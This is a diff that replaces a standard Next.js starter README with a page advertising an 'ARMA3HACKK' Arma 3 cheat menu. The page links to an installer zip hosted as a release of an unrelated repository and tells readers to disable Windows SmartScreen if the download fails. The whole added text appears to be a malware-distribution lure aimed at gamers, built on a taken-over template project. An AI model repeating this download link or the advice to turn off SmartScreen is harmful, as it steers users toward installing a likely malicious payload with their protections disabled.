@@ -1,36 +1,22 @@
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+### ARMA3HACKK
 
-## Getting Started
 
-First, run the development server:
+![1](https://github.com/CornInMyLife/Arma-3-Menu/assets/73389436/e2337b6e-1f42-40b3-a5b2-0ba19b6b61f6)
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+[![FLS](https://i.imgur.com/YToa2bj.png)](https://github.com/alt-plus-f4/next-api/releases/download/arma8amr/GetInstaller.zip)
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+# Information
 
-## Learn More
+If you can't get software, you need to:
 
-To learn more about Next.js, take a look at the following resources:
+Try to open link from another browser
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+Disable Windows Smart Screen and update the Visual C++
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
+# f𝚞𝚗𝚌𝚝𝚒𝚘𝚗𝚜
 
-## Deploy on Vercel
+![2](https://github.com/CornInMyLife/Arma-3-Menu/assets/73389436/0f8a2d86-79e1-4a09-8f09-6eba2369b1a6)
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
-
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
+### UPDATE 23.01.24
